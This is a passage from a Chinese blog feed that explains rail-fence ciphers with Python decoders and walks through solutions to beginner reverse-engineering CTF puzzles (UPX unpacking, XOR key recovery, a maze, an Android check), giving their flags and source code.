   <span class="hljs-type">int</span> a,b,c,d,e,f,n,m;
   <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d%d%d%d&quot;</span>,&amp;a,&amp;b,&amp;c,&amp;d,&amp;e);
   n=a^b^c^d^e;
   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,n);
   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<p>扩展：&amp;（与）运算<br>都是1时结果才为1；<br>二进制与运算规则:1&amp;1=1 1&amp;0=0 0&amp;0=0</p>
]]></content>
  </entry>
  <entry>
    <title>栅栏密码&amp;W型栅栏密码</title>
    <url>/2023/02/27/%E6%A0%85%E6%A0%8F%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h1 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h1><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话）</p>
<h3 id="加密原理"><a href="#加密原理" class="headerlink" title="加密原理"></a>加密原理</h3><p>①把将要传递的信息中的字母交替排成上下两行。<br>②再将下面一行字母排在上面一行的后边，从而形成一段密码。<br>③例如：<br>明文：THE LONGEST DAY MUST HAVE AN END<br>加密：<br>1、把将要传递的信息中的字母交替排成上下两行。<br>T E O G S D Y U T A E N N<br>H L N E T A M S H V A E D<br>2、 密文：<br>将下面一行字母排在上面一行的后边。<br>TEOGSDYUTAENN HLNETAMSHVAED<br>解密：<br>先将密文分为两行<br>T E O G S D Y U T A E N N<br>H L N E T A M S H V A E D<br>再按上下上下的顺序组合成一句话<br>明文：THE LONGEST DAY MUST HAVE AN END</p>
<h3 id="解密代码"><a href="#解密代码" class="headerlink" title="解密代码"></a>解密代码</h3><p>传统栅栏密码的密钥是密文长度的因数。<br>如密文长度为n，加密密钥为x，则有n%x==0。且解密密钥即为n/x。<br>代码：</p>
<pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span>
<span class="hljs-string">遍历所有可能的栏数，并得到加/解密结果</span>
<span class="hljs-string">&#x27;&#x27;&#x27;</span>
s = <span class="hljs-string">&#x27;KYsd3js2E&#123;a2jda&#125;&#x27;</span>
factors = [fac <span class="hljs-keyword">for</span> fac <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-built_in">len</span>(s)) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(s)%fac == <span class="hljs-number">0</span>] <span class="hljs-comment">#取得密文长度的所有因数</span>
<span class="hljs-keyword">for</span> fac <span class="hljs-keyword">in</span> factors:
    flag = <span class="hljs-string">&#x27;&#x27;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(fac): <span class="hljs-comment">#按一定的步长取几组字符，并连接起来，这里组数就等于步长数</span>
        flag += s[i::fac]
    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(fac)+<span class="hljs-string">&#x27;栏：&#x27;</span>+flag)
</code></pre>
<h2 id="W型栅栏密码"><a href="#W型栅栏密码" class="headerlink" title="W型栅栏密码"></a>W型栅栏密码</h2><p>W型栅栏密码是栅栏密码的变种，<br>将明文按w型排列，然后将每一行的字母依次连起来组成密文，行数就是密钥。<br>解密则同样画出这个w型图案，将每一列的字母依次连接起来组成明文。<br>W型栅栏密码的密钥不只是密文长度的因数，任何小于密文长度大于1的整数都有可能。<br>代码：</p>
<pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span>
<span class="hljs-string">若知道栏数，则使用decode解密，若不知道，则使用crack_cipher遍历所有可能性</span>
<span class="hljs-string">&#x27;&#x27;&#x27;</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_w</span>(<span class="hljs-params">string, n</span>): 
    <span class="hljs-string">&#x27;&#x27;&#x27;将字符排列成w型&#x27;&#x27;&#x27;</span>
    array = [[<span class="hljs-string">&#x27;.&#x27;</span>]*<span class="hljs-built_in">len</span>(string) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n)] <span class="hljs-comment">#生成初始矩阵</span>
    row = <span class="hljs-number">0</span>
    upflag = <span class="hljs-literal">False</span>
    <span class="hljs-keyword">for</span> col <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(string)): <span class="hljs-comment">#在矩阵上按w型画出string</span>
        array[row][col] = string[col]
        <span class="hljs-keyword">if</span> row == n-<span class="hljs-number">1</span>:
            upflag = <span class="hljs-literal">True</span>
        <span class="hljs-keyword">if</span> row == <span class="hljs-number">0</span>:
            upflag = <span class="hljs-literal">False</span>
        <span class="hljs-keyword">if</span> upflag:
            row -= <span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            row += <span class="hljs-number">1</span>
    <span class="hljs-keyword">return</span> array

<span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">string, n</span>):
    <span class="hljs-string">&#x27;&#x27;&#x27;加密&#x27;&#x27;&#x27;</span>
    array = generate_w(string, n)
    msg = []
    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n): <span class="hljs-comment">#将每行的字符连起来</span>
        <span class="hljs-keyword">for</span> col <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(string)):
            <span class="hljs-keyword">if</span> array[row][col] != <span class="hljs-string">&#x27;.&#x27;</span>:
                msg.append(array[row][col])
    <span class="hljs-keyword">return</span> array, msg

<span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">string, n</span>):
    <span class="hljs-string">&#x27;&#x27;&#x27;解密&#x27;&#x27;&#x27;</span>
    array = generate_w(string, n)
    sub = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n): <span class="hljs-comment">#将w型字符按行的顺序依次替换为string</span>
        <span class="hljs-keyword">for</span> col <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(string)):
            <span class="hljs-keyword">if</span> array[row][col] != <span class="hljs-string">&#x27;.&#x27;</span>:
                array[row][col] = string[sub]
                sub += <span class="hljs-number">1</span>
    msg = []
    <span class="hljs-keyword">for</span> col <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(string)): <span class="hljs-comment">#以列的顺序依次连接各字符</span>
        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):
            <span class="hljs-keyword">if</span> array[row][col] != <span class="hljs-string">&#x27;.&#x27;</span>:
                msg.append(array[row][col])
    <span class="hljs-keyword">return</span> array, msg

<span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_cipher</span>(<span class="hljs-params">string</span>):
    <span class="hljs-string">&#x27;&#x27;&#x27;破解密码&#x27;&#x27;&#x27;</span>
    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(string)): <span class="hljs-comment">#遍历所有可能的栏数</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(n)+<span class="hljs-string">&#x27;栏：&#x27;</span>+<span class="hljs-string">&#x27;&#x27;</span>.join(decode(string, n)[<span class="hljs-number">1</span>]))

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
    string = <span class="hljs-string">&quot;ccehgyaefnpeoobe&#123;lcirg&#125;epriec_ora_g&quot;</span>
    n = <span class="hljs-number">5</span> <span class="hljs-comment">#栏数</span>

    <span class="hljs-comment">#若不知道栏数，则遍历所有可能</span>
    <span class="hljs-comment"># crack_cipher(string)</span>

    <span class="hljs-comment">#若知道栏数</span>
    array,msg = decode(string, n)
    <span class="hljs-comment"># array,msg = encode(string, n)</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> array: <span class="hljs-built_in">print</span>(i)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(msg))
</code></pre>
<h6 id="WWW型的解密网站"><a href="#WWW型的解密网站" class="headerlink" title="WWW型的解密网站"></a>WWW型的解密网站</h6><p><a href="http://www.atoolbox.net/Tool.php?Id=777">http://www.atoolbox.net/Tool.php?Id=777</a></p>
]]></content>
  </entry>
  <entry>
    <title>记RE出题</title>
    <url>/2023/11/07/%E8%AE%B0RE%E5%87%BA%E9%A2%98/</url>
    <content><![CDATA[<h1 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h1><p>pyc反编译，运行python代码得到flag</p>
<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span>
<span class="hljs-comment"># -*- coding: UTF-8 -*-</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">print_hi</span>(<span class="hljs-params">name</span>):

    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Oh_<span class="hljs-subst">&#123;name&#125;</span>&#x27;</span>)
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    print_hi(<span class="hljs-string">&#x27;RE_is_f5n&#x27;</span>)</code></pre>

<h1 id="密码表"><a href="#密码表" class="headerlink" title="密码表"></a>密码表</h1><p>考察阅读代码的能力<br>python代码：</p>
<pre><code class="hljs python"><span class="hljs-comment">#!/bin/bash/python</span>
buf=[]
v14=[]
v10=<span class="hljs-string">&quot;9F!R9k!w3U!tM88W90d&quot;</span>
v7=<span class="hljs-string">&quot;9517384206&quot;</span>
v20=<span class="hljs-string">&quot;MNBVCXZASDFGHIJKLPOIUYQWERT&quot;</span>
v15=<span class="hljs-string">&quot;qeadzcwsxryfhvntgbmlkjuiop&quot;</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">19</span>):
    v14.append(v10[i])

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">19</span>):
    <span class="hljs-keyword">if</span>(v14[i]==<span class="hljs-string">&#x27;!&#x27;</span>):
        buf.append(<span class="hljs-number">95</span>)
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(v15)):
        <span class="hljs-keyword">if</span>(v14[i]==v15[j]):
            buf.append(j+<span class="hljs-number">65</span>)
            <span class="hljs-keyword">continue</span>
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(v20)):
        <span class="hljs-keyword">if</span>(v14[i]==v20[j]):
            buf.append(j+<span class="hljs-number">97</span>)
            <span class="hljs-keyword">continue</span>
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(v7)):
        <span class="hljs-keyword">if</span>(v14[i]==v7[j]):
            buf.append(j+<span class="hljs-number">48</span>)
            <span class="hljs-keyword">continue</span>
<span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;&quot;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> buf:
    <span class="hljs-built_in">str</span>+=<span class="hljs-built_in">chr</span>(i)
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)</code></pre>
<p>C语言代码：</p>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span>  </span>
  
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;  
    <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>];  
    <span class="hljs-type">char</span> v14[<span class="hljs-number">20</span>];  
    <span class="hljs-type">char</span> v10[] = <span class="hljs-string">&quot;9F!R9k!w3U!tM88W90d&quot;</span>;  
    <span class="hljs-type">char</span> v7[] = <span class="hljs-string">&quot;9517384206&quot;</span>;  
    <span class="hljs-type">char</span> v20[] = <span class="hljs-string">&quot;MNBVCXZASDFGHIJKLPOIUYQWERT&quot;</span>;  
    <span class="hljs-type">char</span> v15[] = <span class="hljs-string">&quot;qeadzcwsxryfhvntgbmlkjuiop&quot;</span>;  
      
    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">19</span>; i++) &#123;  
        v14[i] = v10[i];  
    &#125;  
    v14[<span class="hljs-number">19</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>; <span class="hljs-comment">// 字符串以&#x27;\0&#x27;结尾  </span>
  
    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">19</span>; i++) &#123;  
        <span class="hljs-keyword">if</span>(v14[i] == <span class="hljs-string">&#x27;!&#x27;</span>) &#123;  
            buf[i] = <span class="hljs-number">95</span>;  
        &#125; <span class="hljs-keyword">else</span> &#123;  
            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-built_in">strlen</span>(v15); j++) &#123;  
                <span class="hljs-keyword">if</span>(v14[i] == v15[j]) &#123;  
                    buf[i] = j + <span class="hljs-number">65</span>;  
                    <span class="hljs-keyword">break</span>;  
                &#125;  
            &#125;  
            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-built_in">strlen</span>(v20); j++) &#123;  
                <span class="hljs-keyword">if</span>(v14[i] == v20[j]) &#123;  
                    buf[i] = j + <span class="hljs-number">97</span>;  
                    <span class="hljs-keyword">break</span>;  
                &#125;  
            &#125;  
            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-built_in">strlen</span>(v7); j++) &#123;  
                <span class="hljs-keyword">if</span>(v14[i] == v7[j]) &#123;  
                    buf[i] = j + <span class="hljs-number">48</span>;  
                    <span class="hljs-keyword">break</span>;  
                &#125;  
            &#125;  
        &#125;  
    &#125;  
    buf[<span class="hljs-number">19</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>; <span class="hljs-comment">// 字符串以&#x27;\0&#x27;结尾  </span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, buf);  
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  
&#125;</code></pre>
<p>flag[0k_z0U_G4u_Pa55x08D]</p>
<h1 id="upx"><a href="#upx" class="headerlink" title="upx"></a>upx</h1><p>文件拖入exe，发现有壳，需要脱壳<br>工具用的是kali自带脱壳工具，将文件拖入虚拟机，执行命令：</p>
<blockquote>
<p>upx -d 文件名</p>
</blockquote>
<p>即可完成脱壳，将脱壳后的文件拖入64位IDA，反编译后找到flag为flag[YO6_d1d_@_g00d_j0b]</p>
<h1 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h1><p>题目源码</p>
<pre><code class="hljs python">crack = <span class="hljs-string">&#x27;*&amp;0*********0*********0*********00000*********0******0000******0*********0*0000****000**0********$0*&#x27;</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">s, list1</span>):
    l = <span class="hljs-built_in">input</span>()
    flag = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> l:
        <span class="hljs-keyword">if</span> i == <span class="hljs-string">&#x27;d&#x27;</span> <span class="hljs-keyword">and</span> list1[s + <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;0&#x27;</span>:
            s += <span class="hljs-number">1</span>
            <span class="hljs-keyword">continue</span>
        <span class="hljs-keyword">if</span> i == <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">and</span> list1[s - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;0&#x27;</span>:
            s -= <span class="hljs-number">1</span>
            <span class="hljs-keyword">continue</span>
        <span class="hljs-keyword">if</span> i == <span class="hljs-string">&#x27;s&#x27;</span> <span class="hljs-keyword">and</span> list1[s + <span class="hljs-number">10</span>] == <span class="hljs-string">&#x27;0&#x27;</span>:
            s += <span class="hljs-number">10</span>
            <span class="hljs-keyword">continue</span>
        <span class="hljs-keyword">if</span> i == <span class="hljs-string">&#x27;w&#x27;</span> <span class="hljs-keyword">and</span> list1[s - <span class="hljs-number">10</span>] == <span class="hljs-string">&#x27;0&#x27;</span>:
            s -= <span class="hljs-number">10</span>
            <span class="hljs-keyword">continue</span>
        <span class="hljs-keyword">if</span> i == <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">and</span> list1[s - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;$&#x27;</span>:
            flag = <span class="hljs-number">1</span>
            <span class="hljs-keyword">continue</span>
        flag = <span class="hljs-number">2</span>
    <span class="hljs-keyword">if</span> flag == <span class="hljs-number">0</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;oh wrong&#x27;</span>)
    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(l) != <span class="hljs-number">25</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;wrong format1&#x27;</span>)
    <span class="hljs-keyword">elif</span> flag == <span class="hljs-number">1</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;you solved, flag is AGCTF&#123;your input&#125;&#x27;</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;wrong format2&#x27;</span>)
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    crack_list = <span class="hljs-built_in">list</span>(crack)
    s = crack_list.index(<span class="hljs-string">&#x27;&amp;&#x27;</span>)
    run(s, crack_list)</code></pre>
<p>迷宫题，为一个10*10的迷宫，flag就是迷宫的路线<br>flag[dsssddddssaaasssddwdddssa]</p>
<h1 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h1><p>出自攻防世界<br>拖入64位IDA，F5反编译，查看伪代码</p>
<pre><code class="hljs csharp">_main();
  v11 = <span class="hljs-number">0</span>;
  v9 = <span class="hljs-number">0</span>;
  puts(<span class="hljs-string">&quot;Please input your flag:&quot;</span>);
  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )
  &#123;
    v8 = getchar();
    <span class="hljs-keyword">if</span> ( v8 == <span class="hljs-number">10</span> ) 
      <span class="hljs-keyword">break</span>;
    v7 = key[v9 % <span class="hljs-number">4</span>] ^ v8;         <span class="hljs-comment">//输入的字符，进行异或操作，得到v7</span>
    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )                  
    &#123;
      v4 = v7--;               <span class="hljs-comment">//循环v7次</span>
      <span class="hljs-keyword">if</span> ( v4 &lt;= <span class="hljs-number">0</span> )            <span class="hljs-comment">//此while循环是向s[]中输入v7个1</span>
        <span class="hljs-keyword">break</span>;
      v3 = v11++;
      s[v3] = <span class="hljs-number">1</span>;
    &#125;
    v5 = v11++;                  <span class="hljs-comment">//输出v7个1后，使用0与下一串1隔开	</span>
    s[v5] = <span class="hljs-number">0</span>;                  
    ++v9;
  &#125;
  <span class="hljs-keyword">while</span> ( v11 &lt;= <span class="hljs-number">2559</span> )            <span class="hljs-comment">//输入的字符全部转化为1之后，不够2559个的话填充-1（255）</span>
    s[v11++] = <span class="hljs-number">-1</span>;
  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">2559</span>; ++i )
  &#123;
    <span class="hljs-keyword">if</span> ( r[i] != s[i] )            <span class="hljs-comment">//进行比较</span>
    &#123;
      puts(<span class="hljs-string">&quot;Lose lose lose!&quot;</span>);
      <span class="hljs-keyword">break</span>;
    &#125;
  &#125;
  <span class="hljs-keyword">if</span> ( i == <span class="hljs-number">2560</span> )
    puts(<span class="hljs-string">&quot;Win win win!&quot;</span>);
  system(<span class="hljs-string">&quot;pause&quot;</span>);
  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<p>双击跟进key知道是‘SCNU’，脚本如下：</p>
<pre><code class="hljs python">r = [<span class="hljs-number">0x35</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x70</span>,
     <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x66</span>,
     <span class="hljs-number">0x21</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x28</span>]
key = <span class="hljs-string">&#x27;SCNU&#x27;</span>

flag = <span class="hljs-string">&#x27;&#x27;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(r)):
    flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(key[i % <span class="hljs-number">4</span>]) ^ r[i])

<span class="hljs-built_in">print</span>(flag)</code></pre>
<p>运行得flag为flag[Winn3r_n0t_L0s3r_#]</p>
<h1 id="rome"><a href="#rome" class="headerlink" title="rome"></a>rome</h1><p>出自buu<br>脚本：</p>
<pre><code class="hljs python">v15= [ <span class="hljs-string">&#x27;Q&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;z&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;j&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,<span class="hljs-string">&#x27;@&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span> ]
flag=<span class="hljs-string">&quot;&quot;</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">128</span>):<span class="hljs-comment">#ascii表上有127个字符，一个一个试吧</span>
        x=j
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(x).isupper():
            x=(x-<span class="hljs-number">51</span>)%<span class="hljs-number">26</span>+<span class="hljs-number">65</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(x).islower():
            x=(x-<span class="hljs-number">79</span>)%<span class="hljs-number">26</span>+<span class="hljs-number">97</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(x)==v15[i]:
            flag+=<span class="hljs-built_in">chr</span>(j)

<span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;flag&#123;&#x27;</span>+flag+<span class="hljs-string">&#x27;&#125;&#x27;</span>)</code></pre>
<p>flag[Cae3ar_th4_Gre@t]</p>
<h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><p>得到附件为zip格式，改后缀为apk，用jadx打开<br>找到MainActivity，核心判断函数为check<br>分析函数内容，可以看出数组v0即是我们输入的注册码，根据if语句可以确定注册码的长度和s[]数组一样有31位，下面又有一个if语句判断即为我们的关键语句：s[v1] == (v0[v1] ^ 23)<br>因为flag字符都是ASCII码在0-127中，所以这种题目我们直接用python进行爆破，我们用m替换v1，范围是(0,31)，用i替换v0[v1]，i即为flag中的一个一个字符，最后爆破得到flag<br>脚本：</p>
<pre><code class="hljs python">s = [<span class="hljs-number">113</span>, <span class="hljs-number">123</span>, <span class="hljs-number">118</span>, <span class="hljs-number">112</span>, <span class="hljs-number">108</span>, <span class="hljs-number">94</span>, <span class="hljs-number">99</span>, <span class="hljs-number">72</span>, <span class="hljs-number">38</span>, <span class="hljs-number">68</span>, <span class="hljs-number">72</span>, <span class="hljs-number">87</span>, <span class="hljs-number">89</span>, <span class="hljs-number">72</span>, <span class="hljs-number">36</span>, <span class="hljs-number">118</span>, <span class="hljs-number">100</span>, <span class="hljs-number">78</span>, <span class="hljs-number">72</span>, <span class="hljs-number">87</span>, <span class="hljs-number">121</span>, <span class="hljs-number">83</span>, <span class="hljs-number">101</span>, <span class="hljs-number">39</span>, <span class="hljs-number">62</span>, <span class="hljs-number">94</span>, <span class="hljs-number">62</span>, <span class="hljs-number">38</span>, <span class="hljs-number">107</span>, <span class="hljs-number">115</span>, <span class="hljs-number">106</span>]

flag = <span class="hljs-string">&quot;&quot;</span>

<span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">31</span>):
   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">127</span>):
      <span class="hljs-keyword">if</span>(s[m] == (i ^ <span class="hljs-number">23</span>)):
         flag += <span class="hljs-built_in">chr</span>(i)
<span class="hljs-built_in">print</span>(flag)</code></pre>
<p>flag[It_1S_@N_3asY_@nDr0)I)1|d]</p>
<h1 id="check"><a href="#check" class="headerlink" title="check"></a>check</h1><p>可以用IDA直接分析就是读取输入的字符串，然后逐个进行对比<br><img src="https://img-blog.csdnimg.cn/b1e0ab1e9e55491ab1d98dcc0a3bfbce.png" alt="在这里插入图片描述"></p>
<p>这里可以直接用IDA转化为char型就可以看出。<br>flag[hi!_ResWaY_Act]<br>题目源码：</p>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>      </span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span>      </span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;
   <span class="hljs-type">char</span> flag[<span class="hljs-number">20</span>];  <span class="hljs-comment">// 需要定义 flag 变量，这里假设 flag 的最大长度为 20  </span>
   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入 flag：&quot;</span>);
   <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, flag);  <span class="hljs-comment">// 从用户获取输入并存储在 flag 中  </span>

   <span class="hljs-keyword">if</span> (flag[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;f&#x27;</span> &amp;&amp; flag[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;l&#x27;</span> &amp;&amp; flag[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;a&#x27;</span> &amp;&amp; flag[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;g&#x27;</span> &amp;&amp; flag[<span class="hljs-number">4</span>] == <span class="hljs-string">&#x27;&#123;&#x27;</span> &amp;&amp; flag[<span class="hljs-number">5</span>] == <span class="hljs-string">&#x27;h&#x27;</span> &amp;&amp; flag[<span class="hljs-number">6</span>] == <span class="hljs-string">&#x27;i&#x27;</span> &amp;&amp; flag[<span class="hljs-number">7</span>] == <span class="hljs-string">&#x27;!&#x27;</span> &amp;&amp; flag[<span class="hljs-number">8</span>] == <span class="hljs-string">&#x27;_&#x27;</span> &amp;&amp; flag[<span class="hljs-number">9</span>] == <span class="hljs-string">&#x27;R&#x27;</span> &amp;&amp; flag[<span class="hljs-number">10</span>] == <span class="hljs-string">&#x27;e&#x27;</span> &amp;&amp; flag[<span class="hljs-number">11</span>] == <span class="hljs-string">&#x27;s&#x27;</span> &amp;&amp; flag[<span class="hljs-number">12</span>] == <span class="hljs-string">&#x27;W&#x27;</span> &amp;&amp; flag[<span class="hljs-number">13</span>] == <span class="hljs-string">&#x27;a&#x27;</span> &amp;&amp; flag[<span class="hljs-number">14</span>] == <span class="hljs-string">&#x27;Y&#x27;</span> &amp;&amp; flag[<span class="hljs-number">15</span>] == <span class="hljs-string">&#x27;_&#x27;</span> &amp;&amp; flag[<span class="hljs-number">16</span>] == <span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp; flag[<span class="hljs-number">17</span>] == <span class="hljs-string">&#x27;c&#x27;</span> &amp;&amp; flag[<span class="hljs-number">18</span>] == <span class="hljs-string">&#x27;t&#x27;</span> &amp;&amp; flag[<span class="hljs-number">19</span>] == <span class="hljs-string">&#x27;&#125;&#x27;</span>) &#123;
      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;yes,this is a flag\n&quot;</span>);
      getchar();
   &#125;
   <span class="hljs-keyword">else</span> &#123;
